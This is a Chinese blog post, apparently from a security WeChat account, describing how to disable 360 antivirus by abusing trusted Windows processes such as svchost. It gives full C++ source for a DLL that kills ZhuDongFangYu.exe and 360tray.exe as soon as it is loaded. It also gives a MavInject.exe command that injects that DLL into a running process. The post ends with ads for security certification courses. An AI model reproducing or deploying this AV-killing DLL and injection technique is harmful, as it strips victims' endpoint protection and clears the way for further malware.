<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/azd8IgMzlEaiVZ8Qrb_3Qg)

通过上一篇文章我们知道可以通过搜索字符串来判断杀软的拦截规则，  

        [知 “白” 守黑：防病毒软件的致命弱点—排除项与白名单](http://mp.weixin.qq.com/s?__biz=MzU0NDc0NTY3OQ==&mid=2247487924&idx=1&sn=5d41034560058874c8a5937ae1a70d1b&chksm=fb762014cc01a902f5199c980a132283dad25a648e71b80c00b455cb7978cb3756843e97462f&scene=21#wechat_redirect)  

参考这个 https://bbs.kanxue.com/thread-281120.htm 逆向分析以及我们的内存搜索，我们可以发现许多白名单进程，特别是一些系统常驻进程。白名单进程因为受到防病毒软件的信任，往往不会被严格监控，因此可以作为攻击者的突破口。

在这些常驻进程中，`svchost`（Service Host Process）是一个较为典型的例子。

![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2cHOlXibItr7xwSyoH6hjNOarkopR3aM8rszBK3GQsDYuGCOibmopJCFHfRs4I3Mic5dzcymLUP4L1lg/640?wx_fmt=png&from=appmsg)

`svchost` 是 Windows 系统中的核心进程，用于托管和运行各种服务，具有极高的系统权限。然而，`svchost` 并非 PPL（Protected Process Light）进程，所以我们可以很轻松的对它冻手

![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2cHOlXibItr7xwSyoH6hjNOasOYDlyq3ZZU9YETxMZoLMSCrrTWvSWEialY7Gq7k8icOsmypgtITs8hQ/640?wx_fmt=jpeg&from=appmsg)

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <tlhelp32.h>
// 查找并终止指定的进程
bool TerminateProcessByName(const wchar_t* processName) {
    // 获取系统进程快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    // 遍历进程列表
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            // 如果找到匹配的进程名
            if (wcscmp(processEntry.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
                if (hProcess != NULL) {
                    // 终止进程
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);
    return true;
}
void kill() {
    TerminateProcessByName(L"ZhuDongFangYu.exe");
    TerminateProcessByName(L"360tray.exe");
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        kill();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

编译以上 DLL 后选择你喜欢的任意一种注入方式，这里为了方便演示，我们使用 LOLBin 进行注入

![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2eo9bAiaxIMDcRUjeVQGicXEib0xtJOFXxsWPfqLM3RaKkdyzOnaK1c30DE5NIMuN3MdRUhRFU4vXl7A/640?wx_fmt=jpeg&from=appmsg)

```
MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll

```

效果：

[视频详情](javascript:;)

**知识星球**

![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2cHOlXibItr7xwSyoH6hjNOahd6XUoSb4DwhS4kPKSKiaxLIRT6ESpqLO7T0noAjoENEtEWhSodZrcQ/640?wx_fmt=jpeg&from=appmsg)

**信 安 考 证**

  

  

需要考以下各类安全证书的可以联系我，价格优惠、组团更便宜，还送【老鑫安全识星球 **1** 年！

<table width="677"><tbody><tr><td width="557" valign="top"><p>CISP、PTE、PTS、DSG、IRE、IRS、NISP、PMP、CCSK、CISSP、ISO27001...</p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2dfAo1MYT5cNAbrH6iaM38YV6d4DbRoYnT3X25GpAzykQm1rMzFibAlUARj8ppgNEJia1fWaL0VJhoFA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)